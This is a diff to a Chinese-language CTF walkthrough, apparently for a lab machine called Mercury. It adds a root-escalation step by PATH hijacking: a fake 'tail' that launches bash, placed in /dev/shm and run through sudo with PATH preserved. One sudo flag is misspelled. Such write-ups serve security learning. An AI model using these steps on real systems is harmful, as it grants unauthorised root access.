@@ -172,6 +172,27 @@ cat /usr/bin/check_syslog.sh
 知道主要是通过tail命令进行运作，这种情况我们可以实行PATH劫持
 
 ```
-echo 
+echo '/bin/bash' > /dev/shm/tail
 ```
 
+```
+chmod 777 /dev/shm/tail
+```
+
+```
+export PATH=/dev/shm:$PATH
+```
+
+修改PATH环境变量
+
+```
+sudo --preserver-env=PATH /usr/bin/check_syslog.sh
+```
+
+运行sh文件，并通过保留我们修改过的环境变量来执行，最后拿到root权限
+
+![image-20260527131428628](Mercury.assets/image-20260527131428628.png)
+
+成功拿到flag
+
+![image-20260527131505266](Mercury.assets/image-20260527131505266.png)
